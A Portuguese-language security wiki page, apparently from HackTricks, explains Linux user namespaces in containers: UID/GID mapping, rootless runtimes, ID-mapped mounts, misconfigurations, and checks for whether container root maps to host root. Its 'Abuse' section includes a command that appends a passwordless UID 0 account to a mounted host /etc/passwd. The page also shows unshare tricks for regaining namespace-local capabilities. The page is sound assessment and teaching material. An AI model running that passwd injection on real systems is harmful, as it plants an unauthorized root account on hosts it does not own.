# Namespace de usuário

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de usuário altera o significado de user e group IDs ao permitir que o kernel mapeie IDs vistos dentro do namespace para IDs diferentes fora dele. Esta é uma das proteções modernas de container mais importantes porque trata diretamente o maior problema histórico em containers clássicos: **o root dentro do container costumava estar perigosamente próximo do root no host**.

Com namespaces de usuário, um processo pode executar como UID 0 dentro do container e ainda assim corresponder a um intervalo de UIDs não privilegiados no host. Isso significa que o processo pode se comportar como root para muitas tarefas dentro do container, ao mesmo tempo em que é muito menos potente do ponto de vista do host. Isso não resolve todos os problemas de segurança de containers, mas altera significativamente as consequências de um comprometimento de container.

## Funcionamento

Um namespace de usuário possui arquivos de mapeamento como `/proc/self/uid_map` e `/proc/self/gid_map` que descrevem como os IDs do namespace se traduzem em IDs parent. Se o root dentro do namespace for mapeado para um UID não privilegiado no host, então operações que exigiriam o verdadeiro root do host simplesmente não têm o mesmo peso. É por isso que namespaces de usuário são centrais para os **rootless containers** e por que eles são uma das maiores diferenças entre os padrões antigos de containers com root e designs modernos de menor privilégio.

O ponto é sutil mas crucial: o root dentro do container não é eliminado, ele é **traduzido**. O processo ainda experimenta um ambiente similar ao root localmente, mas o host não deve tratá-lo como root completo.

## Laboratório

Um teste manual é:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Isso faz com que o usuário atual apareça como root dentro do namespace, enquanto ainda não é root do host fora dele. É uma das melhores demos simples para entender por que user namespaces são tão valiosos.

Em containers, você pode comparar o mapeamento visível com:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
A saída exata depende se o engine está usando user namespace remapping ou uma configuração rootful mais tradicional.

Você também pode ler o mapeamento do lado do host com:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Uso em tempo de execução

Rootless Podman é um dos exemplos mais claros de namespaces de usuário sendo tratados como um mecanismo de segurança de primeira classe. Rootless Docker também depende deles. O suporte a userns-remap do Docker melhora a segurança em implantações de daemon com privilégios de root também, embora historicamente muitas implantações o deixassem desativado por razões de compatibilidade. O suporte do Kubernetes a namespaces de usuário melhorou, mas a adoção e os padrões variam conforme o runtime, a distro e a política do cluster. Sistemas Incus/LXC também dependem fortemente de UID/GID shifting e das ideias de idmapping.

A tendência geral é clara: ambientes que usam namespaces de usuário de forma séria geralmente oferecem uma resposta melhor para "o que o root do container realmente significa?" do que ambientes que não o fazem.

## Detalhes Avançados de Mapeamento

Quando um processo sem privilégios escreve em `uid_map` ou `gid_map`, o kernel aplica regras mais rígidas do que as aplicadas a um processo na namespace pai com privilégios. Apenas mapeamentos limitados são permitidos, e para `gid_map` quem escreve normalmente precisa desabilitar `setgroups(2)` primeiro:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Esse detalhe importa porque explica por que a configuração de namespaces de usuário às vezes falha em experimentos rootless e por que runtimes precisam de lógica auxiliar cuidadosa para delegação de UID/GID.

Outra funcionalidade avançada é o **ID-mapped mount**. Em vez de alterar a propriedade no disco, um ID-mapped mount aplica um mapeamento de namespace de usuário a um mount para que a propriedade apareça traduzida nessa visão do mount. Isso é especialmente relevante em setups rootless e runtimes modernos porque permite usar caminhos compartilhados do host sem operações recursivas de `chown`. Em termos de segurança, a funcionalidade modifica como um bind mount aparece como gravável de dentro do namespace, mesmo que não reescreva os metadados do sistema de arquivos subjacente.

Por fim, lembre-se de que quando um processo cria ou entra em um novo namespace de usuário, ele recebe um conjunto completo de capabilities **dentro desse namespace**. Isso não significa que ele ganhou repentinamente poder global no host. Significa que essas capabilities podem ser usadas apenas onde o modelo de namespaces e outras proteções o permitem. É por isso que `unshare -U` pode, de repente, tornar operações de montagem ou operações privilegiadas locais ao namespace possíveis sem, diretamente, fazer o limite do root do host desaparecer.

## Misconfigurations

A principal fraqueza é simplesmente não usar namespaces de usuário em ambientes onde eles seriam viáveis. Se o root do container mapeia muito diretamente para o root do host, mounts graváveis do host e operações privilegiadas do kernel se tornam muito mais perigosos. Outro problema é forçar o compartilhamento do namespace de usuário do host ou desabilitar o remapping por compatibilidade sem reconhecer o quanto isso altera a fronteira de confiança.

Namespaces de usuário também precisam ser consideradas em conjunto com o resto do modelo. Mesmo quando estão ativas, uma exposição ampla da API do runtime ou uma configuração de runtime muito fraca ainda podem permitir escalada de privilégios por outros caminhos. Mas sem elas, muitas classes antigas de breakout ficam muito mais fáceis de explorar.

## Abuse

Se o container é rootful sem separação de namespaces de usuário, um bind mount gravável do host torna-se muito mais perigoso porque o processo pode realmente estar escrevendo como root do host. Capabilities perigosas tornam-se igualmente mais relevantes. O atacante não precisa mais lutar tanto contra a fronteira de tradução porque essa fronteira praticamente não existe.

A presença ou ausência de namespaces de usuário deve ser verificada cedo ao avaliar um caminho de breakout de container. Isso não responde a todas as perguntas, mas mostra imediatamente se "root in container" tem relevância direta no host.

O padrão de abuso mais prático é confirmar o mapeamento e então testar imediatamente se o conteúdo montado do host é gravável com privilégios relevantes para o host:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Se o arquivo for criado como root real do host, o isolamento do user namespace é efetivamente inexistente para esse caminho. Nesse ponto, abusos clássicos de arquivos do host tornam-se realistas:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Uma confirmação mais segura em uma avaliação ao vivo é escrever um marcador benigno em vez de modificar arquivos críticos:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Essas verificações importam porque respondem rapidamente à pergunta real: o root neste container mapeia-se suficientemente próximo ao root do host a ponto de uma montagem de host gravável tornar-se imediatamente um caminho de comprometimento do host?

### Exemplo completo: Recuperando capacidades locais do namespace

Se seccomp permite `unshare` e o ambiente permite um novo namespace de usuário, o processo pode recuperar um conjunto completo de capacidades dentro desse novo namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Isto por si só não é um host escape. A razão pela qual isso importa é que user namespaces podem reativar ações privilegiadas namespace-local que, mais tarde, se combinam com weak mounts, kernels vulneráveis ou superfícies de runtime mal expostas.

## Verificações

Estes comandos têm como objetivo responder à pergunta mais importante desta página: a que equivale root dentro deste container no host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- Se o processo for UID 0 e os arquivos de mapeamento mostrarem um mapeamento direto ou muito próximo para root do host, o container é muito mais perigoso.
- Se root for mapeado para um intervalo de host não privilegiado, essa é uma base muito mais segura e normalmente indica isolamento real do user namespace.
- Os arquivos de mapeamento são mais valiosos do que apenas `id`, porque `id` mostra apenas a identidade local ao namespace.

Se a carga de trabalho for executada como UID 0 e o mapeamento mostrar que isso corresponde de forma próxima ao root do host, você deve interpretar o restante dos privilégios do container de forma muito mais restrita.
{{#include ../../../../../banners/hacktricks-training.md}}
